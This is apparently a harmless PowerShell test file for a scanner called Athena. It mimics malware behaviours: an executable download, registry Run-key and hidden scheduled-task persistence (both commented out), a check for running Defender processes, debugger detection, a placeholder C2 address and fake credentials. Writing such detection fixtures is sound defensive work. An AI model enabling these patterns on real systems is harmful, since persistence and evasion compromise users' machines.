# Safe PowerShell test file simulating malware patterns
# This is NOT malicious - for testing purposes only

# Suspicious download patterns
$url = "http://example.com/totally-not-malware.exe"
$output = "$env:TEMP\test.exe"
# Invoke-WebRequest -Uri $url -OutFile $output # Commented for safety

# Base64 encoding pattern
$text = "This is a test payload"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))

# Registry manipulation patterns (commented for safety)
# New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Test" -Value "C:\test.exe"

# Process enumeration
Get-Process | Where-Object {$_.ProcessName -like "*defender*"}

# Suspicious WMI usage
# Get-WmiObject -Class Win32_Process -Filter "name = 'svchost.exe'"

# Anti-analysis patterns
if ([System.Diagnostics.Debugger]::IsAttached) {
    Write-Host "Debugger detected (test)"
}

# Persistence patterns
$taskName = "TestTask"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command 'Write-Host Test'"
# Register-ScheduledTask -TaskName $taskName -Action $action # Commented for safety

# Network beacon simulation
$beaconInterval = 300
$c2Server = "192.168.1.100"

# Credential harvesting patterns (safe simulation)
$fakeCredential = @{
    Username = "test_user"
    Password = "not_a_real_password"
}

Write-Host "This is a safe test file for Athena security analysis"